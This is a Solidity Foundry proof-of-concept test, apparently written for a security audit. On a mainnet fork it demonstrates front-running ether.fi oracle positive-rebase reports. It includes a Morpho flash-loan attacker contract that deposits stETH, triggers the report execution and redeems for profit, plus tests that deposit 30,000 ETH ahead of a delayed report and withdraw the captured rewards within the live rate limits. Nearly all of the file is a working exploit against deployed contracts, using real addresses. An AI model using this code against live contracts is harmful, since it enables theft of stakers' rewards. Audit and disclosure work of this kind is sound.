// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// @audit this one is the PoC
import "./TestSetup.sol";
import "../script/deploys/Deployed.s.sol";

// The deployed eETH implementation exposes these getters, while the source
// type in this checkout does not yet include them in its ABI.
interface IEETHRateLimitIds {
    function EETH_MINT_LIMIT_ID() external view returns (bytes32);
    function EETH_BURN_LIMIT_ID() external view returns (bytes32);
}

/// @dev The checkout's TestSetup leaves `rateLimiterInstance` unset on this
/// mainnet fork. Read the actual immutable rate-limiter address from the
/// deployed eETH implementation instead.
interface IEETHRateLimiterGetter {
    function rateLimiter() external view returns (address);
}

/// @dev Minimal ABI used by this PoC. Bucket amounts are denominated in gwei.
interface IDeployedEtherFiRateLimiter {
    function consumable(bytes32 limitId) external view returns (uint64);

    function getLimit(bytes32 limitId)
        external
        view
        returns (
            uint64 capacity,
            uint64 remaining,
            uint64 refillRatePerSecond,
            uint256 lastRefillTimestamp
        );
}

interface ILiquidityPoolWithdrawalLimits {
    function maxWithdrawAmount() external view returns (uint256);
    function minWithdrawAmount() external view returns (uint256);
}

interface IEtherFiAdminWithdrawalLimits {
    function maxFinalizedWithdrawalAmountPerDay() external view returns (uint128);
    function maxNumberOfRequestsToFinalizePerReport() external view returns (uint256);
}

/// @dev ABI shim for the currently deployed mainnet oracle.
/// The local checkout has an 11-field report that includes
/// `withdrawalRequestsToInvalidate`; the deployed proxy still accepts the
/// 10-field tuple below. Struct shape changes alter external selectors.
interface IDeployedEtherFiOracleV10 {
    struct OracleReport {
        uint32 consensusVersion;
        uint32 refSlotFrom;
        uint32 refSlotTo;
        uint32 refBlockFrom;
        uint32 refBlockTo;
        int128 accruedRewards;
        uint128 protocolFees;
        uint256[] validatorsToApprove;
        uint32 lastFinalizedWithdrawalRequestId;
        uint128 finalizedWithdrawalAmount;
    }

    function submitReport(OracleReport calldata report) external returns (bool);
}

/// @dev `executeTasks` also embeds the report tuple in its selector, so it must
/// use the same deployed 10-field ABI rather than the checkout's 11-field ABI.
interface IDeployedEtherFiAdminV10 {
    function executeTasks(
        IDeployedEtherFiOracleV10.OracleReport calldata report
    ) external;
}

interface IMorphoAtomicFlashLender {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

interface IWstETHAtomic is IERC20 {
    function wrap(uint256 stETHAmount) external returns (uint256);
    function unwrap(uint256 wstETHAmount) external returns (uint256);
    function getWstETHByStETH(uint256 stETHAmount) external view returns (uint256);
}

/// @dev Executes the complete attack inside Morpho Blue flash-loan callback.
contract AtomicStEthRebaseBorrower {
    address internal constant MORPHO = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;

    IWstETHAtomic public immutable wstETH;
    IERC20 public immutable stETH;
    IERC20 public immutable eETH;
    ILiquifier public immutable liquifier;
    IEtherFiRedemptionManager public immutable redemptionManager;
    address public immutable etherFiAdmin;
    bytes internal executionCalldata;

    constructor(
        address _wstETH,
        address _stETH,
        address _eETH,
        address _liquifier,
        address _redemptionManager,
        address _etherFiAdmin,
        bytes memory _executionCalldata
    ) {
        wstETH = IWstETHAtomic(_wstETH);
        stETH = IERC20(_stETH);
        eETH = IERC20(_eETH);
        liquifier = ILiquifier(_liquifier);
        redemptionManager = IEtherFiRedemptionManager(_redemptionManager);
        etherFiAdmin = _etherFiAdmin;
        executionCalldata = _executionCalldata;
    }

    function attack(uint256 wstETHAmount) external {
        IMorphoAtomicFlashLender(MORPHO).flashLoan(
            address(wstETH), wstETHAmount, bytes("")
        );
    }

    function onMorphoFlashLoan(uint256 assets, bytes calldata) external {
        require(msg.sender == MORPHO, "not Morpho");

        uint256 stETHAmount = wstETH.unwrap(assets);
        stETH.approve(address(liquifier), stETHAmount);
        liquifier.depositWithERC20(
            address(stETH), stETHAmount, stETHAmount - 10, address(0)
        );

        (bool executed, bytes memory returndata) = etherFiAdmin.call(executionCalldata);
        if (!executed) {
            assembly {
                revert(add(returndata, 32), mload(returndata))
            }
        }

        uint256 rebasedEEth = eETH.balanceOf(address(this));
        eETH.approve(address(redemptionManager), rebasedEEth);
        redemptionManager.redeemEEth(rebasedEEth, address(this), address(stETH));

        uint256 finalStETH = stETH.balanceOf(address(this));
        stETH.approve(address(wstETH), finalStETH);
        wstETH.wrap(finalStETH);
        wstETH.approve(MORPHO, assets);
    }
}

/// @notice Mainnet-fork proofs for oracle-report / positive-rebase front-running,
/// followed by fee-free ordinary withdrawals into final native-ETH custody.
contract OraclePositiveRebaseAsyncExitMainnetForkPoC is TestSetup, Deployed {
    address internal constant ORACLE_1 = 0x4293664628469891C4043780874bbFe4Dc6223E2;
    address internal constant ORACLE_2 = 0x9B705E518E1Ca057c216b1a64b37d6549a72f506;
    address internal constant ORACLE_3 = 0xc2f2a6308577eC02FF06221b087DBd5960792C9f;
    address internal constant NORMAL_EXECUTOR = ORACLE_1;

    uint256 internal constant MAX_TEST_APR_BPS = 500;
    uint256 internal constant BASIS_POINTS_DENOMINATOR = 10_000;

    address internal attacker = makeAddr("async-attacker");


    /// @notice Guards the exact selectors used against the deployed mainnet
    /// proxies. The 11-field checkout ABI must not be used for these calls.
    function test_deployedOracleReportV10Selectors() public pure {
        bytes4 expectedSubmitSelector = bytes4(
            keccak256(
                "submitReport((uint32,uint32,uint32,uint32,uint32,int128,uint128,uint256[],uint32,uint128))"
            )
        );
        bytes4 expectedExecuteSelector = bytes4(
            keccak256(
                "executeTasks((uint32,uint32,uint32,uint32,uint32,int128,uint128,uint256[],uint32,uint128))"
            )
        );

        require(
            IDeployedEtherFiOracleV10.submitReport.selector
                == expectedSubmitSelector,
            "wrong deployed submitReport selector"
        );
        require(
            IDeployedEtherFiAdminV10.executeTasks.selector
                == expectedExecuteSelector,
            "wrong deployed executeTasks selector"
        );
    }

    function setUp() public {
        initializeRealisticFork(MAINNET_FORK);

        assertEq(etherFiOracleInstance.quorumSize(), 3, "unexpected quorum");
        assertEq(
            etherFiOracleInstance.lastPublishedReportRefSlot(),
            etherFiAdminInstance.lastHandledReportRefSlot(),
            "fork has a published but unhandled report"
        );

        address deployedRateLimiter =
            IEETHRateLimiterGetter(address(eETHInstance)).rateLimiter();
        emit log_named_address("deployed eETH rate limiter", deployedRateLimiter);
        assertTrue(deployedRateLimiter != address(0), "eETH rate limiter is zero");
        assertGt(deployedRateLimiter.code.length, 0, "eETH rate limiter has no code");
    }

    /// @notice Fully atomic, zero-upfront-capital variant using Morpho Blue.
    function test_atomicStEthRoundTripCapturesPublishedHistoricalRewards() public {
        uint256 incumbentTvl = liquidityPoolInstance.getTotalPooledEther();

        _advanceSlots(uint256(19 days / 12));
        IDeployedEtherFiOracleV10.OracleReport memory delayed = _blankReport(
            int128(int256(incumbentTvl * 25 / BASIS_POINTS_DENOMINATOR)),
            withdrawRequestNFTInstance.lastFinalizedRequestId(),
            0
        );
        _stampAndReachConsensus(delayed);
        _advanceSlots(uint256(etherFiAdminInstance.postReportWaitTimeInSlots()) + 1);

        // The fork clock moved while Chainlink storage stayed at the fork block.
        // Model the normal live heartbeat at the unchanged 1.0 stETH/ETH price.
        address stETHFeed = address(liquifierInstance.stEthPriceFeed());
        vm.mockCall(
            stETHFeed,
            abi.encodeWithSelector(AggregatorV3Interface.latestRoundData.selector),
            abi.encode(uint80(1), int256(1 ether), block.timestamp, block.timestamp, uint80(1))
        );

        bytes memory executionCalldata = abi.encodeCall(
            IDeployedEtherFiAdminV10.executeTasks, (delayed)
        );
        AtomicStEthRebaseBorrower borrower = new AtomicStEthRebaseBorrower(
            0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0,
            address(stEth),
            address(eETHInstance),
            address(liquifierInstance),
            address(etherFiRedemptionManagerInstance),
            address(etherFiAdminInstance),
            executionCalldata
        );

        uint256 targetStETH = 4_987 ether;
        uint256 borrowedWstETH =
            IWstETHAtomic(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0).getWstETHByStETH(targetStETH);
        uint256 morphoLiquidity = IERC20(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0).balanceOf(
            0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb
        );
        assertGe(morphoLiquidity, borrowedWstETH, "insufficient live Morpho liquidity");

        borrower.attack(borrowedWstETH);

        uint256 atomicProfit = IERC20(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0).balanceOf(address(borrower));
        emit log_named_decimal_uint("borrowed wstETH", borrowedWstETH, 18);
        emit log_named_decimal_uint("atomic wstETH profit", atomicProfit, 18);
        assertGt(atomicProfit, 5 ether, "atomic round trip is not profitable");
    }

    function test_deployedMintLimitStillAllowsOver73EthExtraction() public {
        uint256 incumbentTvl = liquidityPoolInstance.getTotalPooledEther();

        // A legitimate delayed positive report at the deployed 25-bps cap.
        _advanceSlots(uint256(19 days / 12));
        IDeployedEtherFiOracleV10.OracleReport memory delayed = _blankReport(
            int128(int256(incumbentTvl * 25 / 10_000)),
            withdrawRequestNFTInstance.lastFinalizedRequestId(),
            0
        );
        _stampAndReachConsensus(delayed);

        // After 19 days the deployed mint bucket is full. Use just under its
        // 30,000 ETH capacity to avoid any unit-rounding ambiguity.
        bytes32 mintLimitId = IEETHRateLimitIds(address(eETHInstance)).EETH_MINT_LIMIT_ID();
        uint256 mintCapacity = uint256(_deployedRateLimiter().consumable(mintLimitId)) * 1 gwei;
        uint256 capital = 30_000 ether - 1 gwei;
        assertGe(mintCapacity, capital, "insufficient deployed mint capacity");

        vm.deal(attacker, capital);
        vm.prank(attacker);
        liquidityPoolInstance.deposit{value: capital}();

        _advanceSlots(uint256(etherFiAdminInstance.postReportWaitTimeInSlots()) + 1);
        vm.prank(NORMAL_EXECUTOR);
        IDeployedEtherFiAdminV10(address(etherFiAdminInstance)).executeTasks(delayed);

        uint256 capturedBalance = eETHInstance.balanceOf(attacker);
        uint256 capturedOldRewards = capturedBalance - capital;
        emit log_named_decimal_uint("captured historical rewards (eETH)", capturedOldRewards, 18);
        assertGt(capturedOldRewards, 73 ether);

        // Convert all captured value into fee-free ordinary withdrawal NFTs,
        // then use the same live-limit finalization helpers as the 24-hour test.
        uint256[] memory requestIds =
            _requestAllUsingCurrentWithdrawalBounds(capturedBalance);
        assertEq(requestIds.length, 31, "unexpected request count");
        uint256 reportCount =
            _finalizeAndClaimAllUsingCurrentLimits(requestIds);
        uint256 profit = attacker.balance - capital;
        emit log_named_uint("normal finalization reports", reportCount);
        emit log_named_decimal_uint("fork attacker profit (ETH)", profit, 18);
        assertGt(profit, 73 ether);
        assertApproxEqAbs(profit, capturedOldRewards, 1e12);
    }

    /// @notice Current deployed-state proof with:
    /// - rewards corresponding to exactly 24 hours at no more than 5% APR;
    /// - the live 30,000 ETH global eETH mint bucket;
    /// - real committee consensus and a normal authorized executor;
    /// - live max-withdraw, withdrawal-finalization, and global burn limits;
    /// - final custody in native ETH;
    /// - strictly positive ETH remaining after the full principal is returned.
    ///
    /// @dev The oracle only publishes refSlotTo values quantized by reportPeriodSlot
    /// (currently 1,280 slots), so an exact 7,200-slot report cannot be represented.
    /// The test therefore uses the first valid report covering >=24 hours, while
    /// accruedRewards contains only one day's rewards at <=5% APR. Its effective
    /// annualized APR over the actual report interval is consequently below 5%.
    function test_currentMainnet_24HourFivePercentAprReturnsCapitalAndPositiveNativeEthProfit()
        public
    {
        uint256 incumbentTvl = liquidityPoolInstance.getTotalPooledEther();
        uint32 lastHandledBeforeReport = etherFiAdminInstance.lastHandledReportRefSlot();

        int32 configuredAprSigned = etherFiAdminInstance.acceptableRebaseAprInBps();
        require(configuredAprSigned > 0, "deployed APR guard is zero or negative");

        uint256 configuredAprBps = uint256(uint32(configuredAprSigned));
        uint256 targetAprBps =
            configuredAprBps < MAX_TEST_APR_BPS ? configuredAprBps : MAX_TEST_APR_BPS;

        assertLe(targetAprBps, MAX_TEST_APR_BPS, "test report exceeds 5% APR");

        // Because refSlotTo is quantized by reportPeriodSlot, move to the first
        // publishable/finalized report whose validation interval covers >=24h.
        _advanceUntilNextReportSpansAtLeast(1 days);

        IDeployedEtherFiOracleV10.OracleReport memory oneDayReport = _blankReport(
            0,
            withdrawRequestNFTInstance.lastFinalizedRequestId(),
            0
        );

        (
            oneDayReport.refSlotFrom,
            oneDayReport.refSlotTo,
            oneDayReport.refBlockFrom
        ) = etherFiOracleInstance.blockStampForNextReport();
        oneDayReport.refBlockTo = uint32(vm.getBlockNumber() - 1);

        uint256 reportElapsedSeconds =
            uint256(oneDayReport.refSlotTo - lastHandledBeforeReport) * 12 seconds;
        assertGe(reportElapsedSeconds, 1 days, "report interval is shorter than 24h");

        // Exactly one day of rewards at targetAprBps. Since the actual report
        // interval is >=1 day, the effective report APR is <=targetAprBps.
        uint256 oneDayRewards =
            incumbentTvl * targetAprBps * 1 days
                / (BASIS_POINTS_DENOMINATOR * 365 days);
        assertGt(oneDayRewards, 0, "one-day report rewards rounded to zero");
        require(oneDayRewards <= uint256(uint128(type(int128).max)), "rewards exceed int128");

        oneDayReport.accruedRewards = int128(int256(oneDayRewards));
        _reachConsensus(oneDayReport);

        // Use the live deployed mint bucket and pin the current 30,000 ETH state.
        bytes32 mintLimitId = IEETHRateLimitIds(address(eETHInstance)).EETH_MINT_LIMIT_ID();
        uint256 mintConsumableWei =
            uint256(_deployedRateLimiter().consumable(mintLimitId)) * 1 gwei;
        // The limiter may be configured as effectively unlimited. Keep the
        // reproduction capital fixed and prove that the live bucket permits it.
        uint256 capital = 30_000 ether - 1 gwei;
        assertGe(mintConsumableWei, capital, "insufficient deployed mint capacity");
        vm.deal(attacker, capital);

        vm.prank(attacker);
        liquidityPoolInstance.deposit{value: capital}();

        assertEq(attacker.balance, 0, "deposit did not commit all attacker capital");

        // Prove that the actual report as executed remains within both the
        // deployed APR guard and the requested <=5% APR bound.
        uint256 tvlAtExecution = liquidityPoolInstance.getTotalPooledEther();
        uint256 effectiveAprBps =
            oneDayRewards * BASIS_POINTS_DENOMINATOR * 365 days
                / (tvlAtExecution * reportElapsedSeconds);

        emit log_named_uint("configured rebase APR (bps)", configuredAprBps);
        emit log_named_uint("effective report APR (bps)", effectiveAprBps);
        emit log_named_uint("report elapsed seconds", reportElapsedSeconds);
        emit log_named_decimal_uint("one-day accrued rewards (ETH)", oneDayRewards, 18);

        assertLe(effectiveAprBps, configuredAprBps, "report violates deployed APR guard");
        assertLe(effectiveAprBps, MAX_TEST_APR_BPS, "report exceeds 5% APR");

        // Normal authorized execution after the deployed post-consensus wait.
        _advanceSlots(uint256(etherFiAdminInstance.postReportWaitTimeInSlots()) + 1);
        vm.prank(NORMAL_EXECUTOR);
        IDeployedEtherFiAdminV10(address(etherFiAdminInstance)).executeTasks(oneDayReport);

        uint256 capturedBalance = eETHInstance.balanceOf(attacker);
        assertGt(capturedBalance, capital, "attacker captured no historical rewards");

        uint256 capturedOldRewards = capturedBalance - capital;
        emit log_named_decimal_uint(
            "24h captured historical rewards (eETH)",
            capturedOldRewards,
            18
        );

        _assertAndLogLiveWithdrawalLimits();

        uint256[] memory requestIds =
            _requestAllUsingCurrentWithdrawalBounds(capturedBalance);

        uint256 reportCount = _finalizeAndClaimAllUsingCurrentLimits(requestIds);

        // Final custody must be native ETH, and the returned amount must exceed
        // the full capital that was initially committed.
        uint256 finalNativeEth = attacker.balance;
        assertGt(finalNativeEth, capital, "principal returned without positive profit");

        uint256 profit = finalNativeEth - capital;
        emit log_named_uint("normal finalization reports", reportCount);
        emit log_named_decimal_uint("capital returned (ETH)", capital, 18);
        emit log_named_decimal_uint("final native ETH custody", finalNativeEth, 18);
        emit log_named_decimal_uint("24h fork attacker profit (ETH)", profit, 18);

        assertGt(profit, 0, "attacker has no positive native-ETH profit");
        assertApproxEqAbs(
            profit,
            capturedOldRewards,
            1e12,
            "withdrawal path lost more than rounding dust"
        );
    }


    /// @dev Resolve the rate limiter actually used by deployed eETH. This avoids
    /// relying on the legacy `rateLimiterInstance` fixture, which is address(0)
    /// in the current TestSetup/Deployed combination.
    function _deployedRateLimiter()
        internal
        view
        returns (IDeployedEtherFiRateLimiter limiter)
    {
        address limiterAddress =
            IEETHRateLimiterGetter(address(eETHInstance)).rateLimiter();

        require(limiterAddress != address(0), "eETH rate limiter is zero");
        require(limiterAddress.code.length != 0, "eETH rate limiter has no code");

        limiter = IDeployedEtherFiRateLimiter(limiterAddress);
    }

    function _assertAndLogLiveWithdrawalLimits() internal {
        uint256 maxWithdraw =
            ILiquidityPoolWithdrawalLimits(address(liquidityPoolInstance)).maxWithdrawAmount();
        uint256 minWithdraw =
            ILiquidityPoolWithdrawalLimits(address(liquidityPoolInstance)).minWithdrawAmount();
        uint256 maxFinalizedPerDay =
            IEtherFiAdminWithdrawalLimits(address(etherFiAdminInstance)).maxFinalizedWithdrawalAmountPerDay();
        uint256 maxRequestsPerReport =
            IEtherFiAdminWithdrawalLimits(address(etherFiAdminInstance)).maxNumberOfRequestsToFinalizePerReport();

        bytes32 burnLimitId =
            IEETHRateLimitIds(address(eETHInstance)).EETH_BURN_LIMIT_ID();
        (
            uint64 burnCapacityGwei,
            uint64 burnRemainingGwei,
            uint64 burnRefillRateGweiPerSecond,
            uint256 burnLastRefillTimestamp
        ) = _deployedRateLimiter().getLimit(burnLimitId);

        uint256 burnCapacityWei = uint256(burnCapacityGwei) * 1 gwei;
        uint256 burnConsumableWei =
            uint256(_deployedRateLimiter().consumable(burnLimitId)) * 1 gwei;

        emit log_named_decimal_uint("live max withdrawal (ETH)", maxWithdraw, 18);
        emit log_named_decimal_uint("live min withdrawal (ETH)", minWithdraw, 18);
        emit log_named_decimal_uint(
            "live finalized withdrawals/day (ETH)", maxFinalizedPerDay, 18
        );
        emit log_named_uint("live max requests/report", maxRequestsPerReport);
        emit log_named_decimal_uint("live burn capacity (ETH)", burnCapacityWei, 18);
        emit log_named_decimal_uint(
            "live initial burn consumable (ETH)", burnConsumableWei, 18
        );
        emit log_named_decimal_uint(
            "live stored burn remaining (ETH)",
            uint256(burnRemainingGwei) * 1 gwei,
            18
        );
        emit log_named_uint("live burn last refill timestamp", burnLastRefillTimestamp);
        emit log_named_uint(
            "live burn refill (gwei/second)",
            uint256(burnRefillRateGweiPerSecond)
        );

        assertGt(maxWithdraw, 0, "max withdrawal is zero");
        assertLe(minWithdraw, maxWithdraw, "invalid withdrawal bounds");
        assertGt(maxFinalizedPerDay, 0, "withdrawal finalization limit is zero");
        assertGt(maxRequestsPerReport, 0, "request finalization count is zero");
        assertGt(burnCapacityWei, 0, "burn bucket capacity is zero");
        assertGt(uint256(burnRefillRateGweiPerSecond), 0, "burn bucket cannot refill");
        assertLe(
            maxWithdraw,
            burnCapacityWei,
            "one maximum withdrawal cannot fit in burn bucket"
        );
    }

    function _requestAllUsingCurrentWithdrawalBounds(uint256 totalAmount)
        internal
        returns (uint256[] memory requestIds)
    {
        uint256 maxRequest = ILiquidityPoolWithdrawalLimits(address(liquidityPoolInstance)).maxWithdrawAmount();
        uint256 minRequest = ILiquidityPoolWithdrawalLimits(address(liquidityPoolInstance)).minWithdrawAmount();

        uint256 requestCount = (totalAmount + maxRequest - 1) / maxRequest;
        assertGt(requestCount, 0, "no withdrawal requests needed");

        // Split evenly rather than using max/max/.../dust so the last request
        // also remains above the deployed minimum withdrawal amount.
        uint256 baseAmount = totalAmount / requestCount;
        uint256 remainder = totalAmount % requestCount;

        assertGe(baseAmount, minRequest, "split creates a sub-minimum request");
        assertLe(baseAmount + (remainder > 0 ? 1 : 0), maxRequest, "split exceeds max");

        requestIds = new uint256[](requestCount);

        vm.startPrank(attacker);
        eETHInstance.approve(address(liquidityPoolInstance), type(uint256).max);

        for (uint256 i; i < requestCount; ++i) {
            uint256 amount = baseAmount + (i < remainder ? 1 : 0);
            assertGe(amount, minRequest, "request below deployed minimum");
            assertLe(amount, maxRequest, "request above deployed maximum");

            requestIds[i] = liquidityPoolInstance.requestWithdraw(attacker, amount);
        }

        vm.stopPrank();
    }

    function _finalizeAndClaimAllUsingCurrentLimits(uint256[] memory requestIds)
        internal
        returns (uint256 reportCount)
    {
        uint256 requestCount = requestIds.length;
        uint32 targetRequestId = uint32(requestIds[requestCount - 1]);
        uint256 nextClaim;

        while (withdrawRequestNFTInstance.lastFinalizedRequestId() < targetRequestId) {
            uint32 cursor = _finalizeNextBatch(targetRequestId);
            reportCount++;

            // Claims are paced against the live global burn bucket. No rate-limit
            // state is modified by the test.
            while (
                nextClaim < requestCount
                    && requestIds[nextClaim] <= cursor
            ) {
                _claimUsingCurrentBurnLimit(requestIds[nextClaim]);
                nextClaim++;
            }
        }

        assertEq(nextClaim, requestCount, "not all attacker requests claimed");
    }

    function _finalizeNextBatch(uint32 targetRequestId)
        internal
        returns (uint32 cursor)
    {
        _advanceUntilNextReportFinalized();

        (uint32 slotFrom, uint32 slotTo, uint32 blockFrom) =
            etherFiOracleInstance.blockStampForNextReport();
        uint256 elapsedSlots =
            slotTo - etherFiAdminInstance.lastHandledReportRefSlot();
        uint256 allowedAmount =
            uint256(IEtherFiAdminWithdrawalLimits(address(etherFiAdminInstance)).maxFinalizedWithdrawalAmountPerDay())
                * (elapsedSlots * 12 seconds) / 1 days;

        uint128 amountToFinalize;
        (cursor, amountToFinalize) = _nextFinalizationBatch(
            targetRequestId,
            allowedAmount,
            liquidityPoolInstance.totalValueInLp()
        );

        IDeployedEtherFiOracleV10.OracleReport memory followUp =
            _blankReport(0, cursor, amountToFinalize);
        followUp.refSlotFrom = slotFrom;
        followUp.refSlotTo = slotTo;
        followUp.refBlockFrom = blockFrom;
        followUp.refBlockTo = uint32(vm.getBlockNumber() - 1);

        _reachConsensus(followUp);
        _advanceSlots(
            uint256(etherFiAdminInstance.postReportWaitTimeInSlots()) + 1
        );
        vm.prank(NORMAL_EXECUTOR);
        IDeployedEtherFiAdminV10(address(etherFiAdminInstance)).executeTasks(followUp);
    }

    function _nextFinalizationBatch(
        uint32 targetRequestId,
        uint256 allowedAmount,
        uint256 availableLiquidity
    ) internal view returns (uint32 cursor, uint128 amountToFinalize) {
        cursor = withdrawRequestNFTInstance.lastFinalizedRequestId();
        uint32 startCursor = cursor;
        uint256 maxRequests =
            IEtherFiAdminWithdrawalLimits(address(etherFiAdminInstance)).maxNumberOfRequestsToFinalizePerReport();

        while (
            cursor < targetRequestId
                && uint256(cursor - startCursor) < maxRequests
        ) {
            IWithdrawRequestNFT.WithdrawRequest memory request =
                withdrawRequestNFTInstance.getRequest(cursor + 1);

            if (request.isValid) {
                uint256 nextAmount =
                    uint256(amountToFinalize) + request.amountOfEEth;
                if (
                    nextAmount > allowedAmount
                        || nextAmount > availableLiquidity
                ) break;
                amountToFinalize = uint128(nextAmount);
            }

            // Invalid requests still advance the globally ordered cursor.
            cursor++;
        }

        assertGt(cursor, startCursor, "finalization cursor did not advance");
    }

    function _claimUsingCurrentBurnLimit(uint256 requestId) internal {
        IWithdrawRequestNFT.WithdrawRequest memory request =
            withdrawRequestNFTInstance.getRequest(requestId);

        bytes32 burnLimitId = IEETHRateLimitIds(address(eETHInstance)).EETH_BURN_LIMIT_ID();

        (
            uint64 capacityGwei,
            uint64 remainingGwei,
            uint64 refillRateGweiPerSecond,
            uint256 lastRefillTimestamp
        ) = _deployedRateLimiter().getLimit(burnLimitId);

        // eETH rounds rate-limit consumption up to whole gwei. request.amountOfEEth
        // is a conservative upper bound for the burn's token-value consumption.
        uint256 neededGwei =
            (uint256(request.amountOfEEth) + 1 gwei - 1) / 1 gwei;

        assertLe(neededGwei, uint256(capacityGwei), "request exceeds burn capacity");

        // The stored tuple values are useful diagnostics; `consumable` remains
        // the authoritative live amount after time-based refill is applied.
        remainingGwei;
        lastRefillTimestamp;

        uint256 availableGwei =
            uint256(_deployedRateLimiter().consumable(burnLimitId));

        if (availableGwei < neededGwei) {
            assertGt(
                uint256(refillRateGweiPerSecond),
                0,
                "burn bucket cannot refill"
            );

            uint256 deficitGwei = neededGwei - availableGwei;
            uint256 waitSeconds =
                (deficitGwei + uint256(refillRateGweiPerSecond) - 1)
                    / uint256(refillRateGweiPerSecond);
            uint256 waitSlots = (waitSeconds + 12 - 1) / 12;

            // One extra slot avoids boundary-rounding ambiguity.
            _advanceSlots(waitSlots + 1);
        }

        assertGe(
            uint256(_deployedRateLimiter().consumable(burnLimitId)),
            neededGwei,
            "burn capacity did not refill sufficiently"
        );

        vm.prank(attacker);
        withdrawRequestNFTInstance.claimWithdraw(requestId);
    }

    function _advanceUntilNextReportSpansAtLeast(uint256 minimumSeconds) internal {
        uint32 lastHandled = etherFiAdminInstance.lastHandledReportRefSlot();
        uint256 minimumSlots = (minimumSeconds + 12 - 1) / 12;
        uint256 reportPeriod = etherFiOracleInstance.reportPeriodSlot();

        while (
            uint256(etherFiOracleInstance.slotForNextReport() - lastHandled)
                < minimumSlots
        ) {
            _advanceSlots(reportPeriod);
        }

        _advanceUntilNextReportFinalized();
    }

    function _blankReport(
        int128 rewards,
        uint32 lastFinalized,
        uint128 finalizedAmount
    ) internal view returns (IDeployedEtherFiOracleV10.OracleReport memory report) {
        uint256[] memory empty = new uint256[](0);
        report = IDeployedEtherFiOracleV10.OracleReport({
            consensusVersion: etherFiOracleInstance.consensusVersion(),
            refSlotFrom: 0,
            refSlotTo: 0,
            refBlockFrom: 0,
            refBlockTo: 0,
            accruedRewards: rewards,
            protocolFees: 0,
            validatorsToApprove: empty,
            lastFinalizedWithdrawalRequestId: lastFinalized,
            finalizedWithdrawalAmount: finalizedAmount
        });
    }

    function _stampAndReachConsensus(IDeployedEtherFiOracleV10.OracleReport memory report) internal {
        (report.refSlotFrom, report.refSlotTo, report.refBlockFrom) =
            etherFiOracleInstance.blockStampForNextReport();
        report.refBlockTo = uint32(vm.getBlockNumber() - 1);
        _reachConsensus(report);
    }

    function _reachConsensus(IDeployedEtherFiOracleV10.OracleReport memory report) internal {
        IDeployedEtherFiOracleV10 deployedOracle =
            IDeployedEtherFiOracleV10(address(etherFiOracleInstance));

        vm.prank(ORACLE_1);
        deployedOracle.submitReport(report);
        vm.prank(ORACLE_2);
        deployedOracle.submitReport(report);
        vm.prank(ORACLE_3);
        deployedOracle.submitReport(report);
    }

    function _advanceUntilNextReportFinalized() internal {
        uint32 target = etherFiOracleInstance.slotForNextReport();
        uint32 current =
            etherFiOracleInstance.computeSlotAtTimestamp(block.timestamp);
        uint32 minimum = ((target / 32) + 3) * 32;
        if (current < minimum) _advanceSlots(uint256(minimum - current));
    }

    function _advanceSlots(uint256 slots) internal {
        uint32 currentSlot =
            etherFiOracleInstance.computeSlotAtTimestamp(block.timestamp);
        vm.roll(vm.getBlockNumber() + slots);
        vm.warp(
            uint256(etherFiOracleInstance.beaconGenesisTimestamp())
                + 12 * (uint256(currentSlot) + slots)
        );
    }
}
